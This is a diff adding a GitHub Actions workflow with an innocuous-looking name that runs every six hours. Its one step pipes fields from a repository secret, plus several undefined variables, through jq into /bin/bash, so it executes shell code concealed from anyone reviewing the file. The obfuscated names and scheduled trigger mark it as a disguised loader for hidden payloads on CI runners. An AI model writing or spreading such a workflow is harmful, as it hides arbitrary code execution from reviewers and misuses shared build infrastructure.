@@ -1,0 +1,25 @@
+name: ailearningxue
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ailearningxue
+        env:
+          dz6: ${{ secrets.dz6 }}
+        run: |
+          echo $dz6 | jq -r .nkirf2242 | /bin/bash
+          echo $xd01750 | jq -r .rblr15103 | /bin/bash
+          echo $djlb7 | jq -r .fhi39 | /bin/bash
+          echo $os62 | jq -r .lat6354 | /bin/bash
+          echo $ka7 | jq -r .spca7284 | /bin/bash
+          echo $fidb35 | jq -r .mkvoo850 | /bin/bash
+          echo $tq907 | jq -r .yf2554 | /bin/bash
+          echo $x873 | jq -r .aymuu3 | /bin/bash
+          echo $qvtmn67 | jq -r .xs3849 | /bin/bash
+          echo $ffmk460 | jq -r .kov3283 | /bin/bash
+
